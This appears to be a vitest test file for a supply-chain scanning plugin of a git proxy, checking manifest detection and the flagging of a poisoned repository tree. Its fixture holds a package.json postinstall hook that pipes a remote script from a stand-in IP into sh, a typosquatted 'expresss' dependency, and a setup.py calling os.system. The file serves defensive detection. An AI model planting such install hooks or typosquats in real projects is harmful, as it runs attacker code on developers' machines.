/**
 * Copyright 2026 GitProxy Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, it, expect } from 'vitest';
import { manifestPathsFromTree } from '../../../plugins/git-proxy-plugin-supply-chain/lib/tree.js';
import { analyzeChangedFiles } from '../../../plugins/git-proxy-plugin-supply-chain/lib/analyze.js';
import { resolveConfig } from '../../../plugins/git-proxy-plugin-supply-chain/lib/config.js';

describe('manifestPathsFromTree', () => {
  it('keeps only recognised manifests, dedups, marks not-deleted', () => {
    const files = manifestPathsFromTree([
      'package.json',
      'src/index.js',
      'svc/requirements.txt',
      'README.md',
      'setup.py',
      'package.json',
    ]);
    expect(files.map((f) => f.path).sort()).toEqual([
      'package.json',
      'setup.py',
      'svc/requirements.txt',
    ]);
    expect(files.every((f) => f.deleted === false)).toBe(true);
  });

  it('handles empty and non-array input', () => {
    expect(manifestPathsFromTree([])).toEqual([]);
    // @ts-expect-error deliberately wrong type
    expect(manifestPathsFromTree(null)).toEqual([]);
  });
});

describe('whole-tree scan (pull semantics: old = null)', () => {
  it('flags a poisoned cloned tree as newly introduced', async () => {
    const contents: Record<string, string> = {
      'package.json': JSON.stringify({
        scripts: { postinstall: 'curl http://198.51.100.4/x.sh | sh' },
        dependencies: { expresss: '^4.0.0' },
      }),
      'setup.py': 'import os\nos.system("id")\n',
    };
    const files = manifestPathsFromTree(Object.keys(contents));
    const readFile = async (p: string, rev: 'old' | 'new') =>
      rev === 'old' ? null : (contents[p] ?? null);

    const { findings, maxSeverity } = await analyzeChangedFiles({
      files,
      readFile,
      config: resolveConfig(),
    });
    const rules = findings.map((f) => f.rule);

    expect(maxSeverity).toBe('critical');
    expect(rules).toContain('install-script');
    expect(rules).toContain('typosquat');
    expect(rules).toContain('python-setup-script');
  });

  it('produces no findings for a clean tree', async () => {
    const contents: Record<string, string> = {
      'package.json': JSON.stringify({ dependencies: { react: '^18.0.0' } }),
      'requirements.txt': 'requests==2.31.0\n',
    };
    const files = manifestPathsFromTree(Object.keys(contents));
    const readFile = async (p: string, rev: 'old' | 'new') =>
      rev === 'old' ? null : (contents[p] ?? null);

    const { findings } = await analyzeChangedFiles({ files, readFile, config: resolveConfig() });
    // Only the informational "new dependencies" listing is acceptable here.
    expect(findings.filter((f) => f.severity !== 'info')).toEqual([]);
  });
});
